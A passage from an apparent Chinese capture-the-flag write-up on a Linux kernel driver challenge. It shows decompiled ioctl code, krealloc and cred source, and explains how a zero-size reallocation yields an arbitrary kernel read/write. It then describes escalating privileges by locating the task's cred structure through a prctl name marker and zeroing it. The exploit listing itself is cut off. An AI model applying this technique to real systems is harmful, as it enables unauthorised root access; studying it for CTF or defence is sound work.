class="keyword">else</span></span><br><span class="line">            v8 = *(result + <span class="number">16</span>) - id;</span><br><span class="line">        v9 = krealloc(*(result + <span class="number">8</span>), v8 + <span class="number">1</span>, <span class="number">37748928LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v9 )</span><br><span class="line">        &#123;</span><br><span class="line">            *(v7 + <span class="number">8</span>) = v9;</span><br><span class="line">            *(v7 + <span class="number">16</span>) = v8;</span><br><span class="line">            <span class="keyword">if</span> ( _InterlockedSub(v7, <span class="number">1u</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                ipc_channel_destroy(v7);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">4294967274LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当krealloc返回值不为0时，可以通过验证，将返回值作为内存块起始地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mm\slab_common.c:</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * krealloc - reallocate memory. The contents will remain unchanged.</span></span><br><span class="line"><span class="comment"> * @p: object to reallocate memory for.</span></span><br><span class="line"><span class="comment"> * @new_size: how many bytes of memory are required.</span></span><br><span class="line"><span class="comment"> * @flags: the type of memory to allocate.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The contents of the object pointed to are preserved up to the</span></span><br><span class="line"><span class="comment"> * lesser of the new and old sizes.  If @p is %NULL, krealloc()</span></span><br><span class="line"><span class="comment"> * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a</span></span><br><span class="line"><span class="comment"> * %NULL pointer, the object pointed to is freed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">krealloc</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *p, <span class="keyword">size_t</span> new_size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!new_size)) &#123;</span><br><span class="line">kfree(p);</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_krealloc(p, new_size, flags);</span><br><span class="line"><span class="keyword">if</span> (ret &amp;&amp; p != ret)</span><br><span class="line">kfree(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(krealloc);</span><br><span class="line"></span><br><span class="line">include\linux\slab.h:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZERO_SIZE_PTR ((void *)16)</span></span><br></pre></td></tr></table></figure><p>所以我们可以构造new_size为0即可返回0x10，并且我们构造为0是让记录size的位置为-1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x77617368</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">24LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    p_lock = &amp;private_data-&gt;lock;</span><br><span class="line">    mutex_lock(&amp;private_data-&gt;lock);</span><br><span class="line">    v14 = private_data-&gt;channel;</span><br><span class="line">    count = write_channel.count;</span><br><span class="line">    <span class="keyword">if</span> ( !private_data-&gt;channel )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">    index = v14-&gt;index;</span><br><span class="line">    <span class="keyword">if</span> ( write_channel.count + index &gt; v14-&gt;buf_size</span><br><span class="line">        || copy_to_user(write_channel.buf, &amp;v14-&gt;data[index], LODWORD(write_channel.count)) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x77617369</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">24LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    p_lock = &amp;private_data-&gt;lock;</span><br><span class="line">    mutex_lock(&amp;private_data-&gt;lock);</span><br><span class="line">    v16 = private_data-&gt;channel;</span><br><span class="line">    count = write_channel.count;</span><br><span class="line">    <span class="keyword">if</span> ( !private_data-&gt;channel )</span><br><span class="line">    &#123;</span><br><span class="line">        LABEL_40:</span><br><span class="line">        count = <span class="number">-6LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v16-&gt;index;</span><br><span class="line">    <span class="keyword">if</span> ( write_channel.count + v17 &gt; v16-&gt;buf_size</span><br><span class="line">        || strncpy_from_user(&amp;v16-&gt;data[v17], write_channel.buf, write_channel.count) &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x7761736A</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">24LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    p_lock = &amp;private_data-&gt;lock;</span><br><span class="line">    count = <span class="number">-6LL</span>;</span><br><span class="line">    mutex_lock(&amp;private_data-&gt;lock);</span><br><span class="line">    v8 = private_data-&gt;channel;</span><br><span class="line">    <span class="keyword">if</span> ( !private_data-&gt;channel )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    <span class="keyword">if</span> ( LODWORD(write_channel.count) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( LODWORD(write_channel.count) == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            count = v8-&gt;index;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    count = (__int64)write_channel.buf;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">char</span> *)v8-&gt;buf_size &lt;= write_channel.buf )</span><br><span class="line">    &#123;</span><br><span class="line">        LABEL_31:</span><br><span class="line">        count = <span class="number">-22LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">    v8-&gt;index = (<span class="keyword">loff_t</span>)write_channel.buf;</span><br><span class="line">    LABEL_9:</span><br><span class="line">    mutex_unlock(p_lock);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br></pre></td></tr></table></figure><p>下面则是根据修改index，然后根据index读取或者写入内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000652 48 8B 5D C8                   mov     rbx, [rbp-38h]</span><br><span class="line">.text:0000000000000656 48 39 58 10                   cmp     [rax+10h], rbx</span><br><span class="line">.text:000000000000065A 76 85                         jbe     short loc_5E1</span><br></pre></td></tr></table></figure><p>并且可以看到下面是无符号比较，所以我们刚刚写入的-1就会变成最大的值，也就造成了任意地址读写了。</p><h2 id="修改cred结构提升权限"><a href="#修改cred结构提升权限" class="headerlink" title="修改cred结构提升权限"></a>修改cred结构提升权限</h2><p>cred结构体应该不会很陌生，所以我们的思路就是修改cred结构体中记录进程权限的值即可</p><p>首先，每一个线程在内核中都对应一个线程栈、一个线程结构块thread_info去调度，结构体里面同时也包含了线程的一系列信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>*<span class="title">task</span>;</span><span class="comment">/* main task structure */</span></span><br><span class="line">__u32flags;<span class="comment">/* low level flags */</span></span><br><span class="line">__u32status;<span class="comment">/* thread synchronous flags */</span></span><br><span class="line">__u32cpu;<span class="comment">/* current CPU */</span></span><br><span class="line"><span class="keyword">mm_segment_t</span>addr_limit;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>sig_on_uaccess_error:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>uaccess_err:<span class="number">1</span>;<span class="comment">/* uaccess failed */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>thread_info结构体存放在线程栈中最低的地址，并且包含一个重要信息task_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">long</span> state;<span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">stack</span>;</span><br><span class="line"><span class="keyword">atomic_t</span> usage;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;<span class="comment">/* per process flags, defined below */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ptrace;</span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">ptracer_cred</span>;</span> <span class="comment">/* Tracer&#x27;s credentials at attach */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment"> * credentials (COW) */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span><span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment"> * credentials (COW) */</span></span><br><span class="line"><span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">       it with task_lock())</span></span><br><span class="line"><span class="comment">     - initialized normally by setup_new_exec */</span></span><br><span class="line"><span class="comment">/* file system info */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span> *<span class="title">nameidata</span>;</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSVIPC</span></span><br><span class="line">    <span class="comment">/* ipc stuff */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sysv_sem</span> <span class="title">sysvsem</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sysv_shm</span> <span class="title">sysvshm</span>;</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ... ... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到其中存放着cred结构体，这里就不再提cred结构体了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">validate_process_creds();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">old = task-&gt;cred;</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line"></span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;session_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;process_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;thread_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_creds);</span><br></pre></td></tr></table></figure><p>可以看到cred结构体是通过kmem_cache_alloc创建的</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>利用内存任意读找到cred结构体，再利用内存任意写，将用于表示权限的数据位写为0，就可以完成提权</p><p>如何找到这个结构体?在task_struct里有一个<code> char comm[TASK_COMM_LEN];</code> 字符数组，这个字符串表示线程的名字，其内容可以通过linux的<code>prctl(PR_SET_NAME,target);</code>来设置指定的值。那么，我们设置一个复杂的长度不超过16字节的字符串作为标记，然后，在内存里搜索这个标记，如果搜索到了，就可以确定这个位置前面就是cred指针</p><p>linux kernel内存映射图：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffffffffffff</span>  ---+-----------+-----------------------------------------------+-------------+</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    <span class="number">8</span>M                 |           | unused hole                                   |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line"><span class="number">0xffffffffff7ff000</span>  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|</span><br><span class="line">    <span class="number">1</span>M                 |           |                                               |+++++++++++++|</span><br><span class="line"><span class="number">0xffffffffff600000</span>  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|</span><br><span class="line">    <span class="number">548</span>K               |           | vsyscalls                                     |+++++++++++++|</span><br><span class="line"><span class="number">0xffffffffff577000</span>  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|</span><br><span class="line">    <span class="number">5</span>M                 |           | hole                                          |+++++++++++++|</span><br><span class="line"><span class="number">0xffffffffff000000</span>  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    <span class="number">1520</span>M              |           | <span class="function"><span class="keyword">module</span> mapping <span class="title">space</span> <span class="params">(MODULES_LEN)</span>            |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">    512M               |           | kernel text mapping, from phys 0              |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    2G                 |           | hole                                          |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    64G                |           | EFI region mapping space                      |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    444G               |           | hole                                          |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    16T                |           | %esp fixup stacks                             |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    3T                 |           | hole                                          |+++++++++++++|</span></span><br><span class="line"><span class="function">0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    16T                |           | kasan shadow <span class="title">memory</span> <span class="params">(<span class="number">16</span>TB)</span>                    |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                          |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|</span></span><br><span class="line"><span class="function">    1T                 |           | <span class="keyword">virtual</span> memory <span class="built_in">map</span> <span class="keyword">for</span> all of struct pages    |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                          |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    32T                |           | vmalloc/<span class="title">ioremap</span> <span class="params">(<span class="number">1</span> &lt;&lt; VMALLOC_SIZE_TB)</span>        |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                          |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">    64T                |           | direct mapping of all phys. memory            |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           | <span class="params">(<span class="number">1</span> &lt;&lt; MAX_PHYSMEM_BITS)</span>                       |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">    8T                 |           | guard hole, reserved <span class="keyword">for</span> hypervisor           |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+</span></span><br><span class="line"><span class="function">                       |-----------|                                               |-------------|</span></span><br><span class="line"><span class="function">                       |-----------| hole caused by [48:63] sign extension         |-------------|</span></span><br><span class="line"><span class="function">                       |-----------|                                               |-------------|</span></span><br><span class="line"><span class="function">0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+</span></span><br><span class="line"><span class="function">    PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">                       |           |                                               |  user space |</span></span><br><span class="line"><span class="function">                       |           |                                               |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">                       |           |                                               |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">                       |           |                                               |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">    128T               |           | different per mm                              |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">                       |           |                                               |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">                       |           |                                               |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">                       |           |                                               |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+</span></span><br></pre></td></tr></table></figure><p>在0xffff880000000000——0xffffc80000000000区域，是堆的分配区域，因此，我们只需要搜索这段内存，即可找到task_struct结构，进而找到cred结构。</p><p>综上，exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 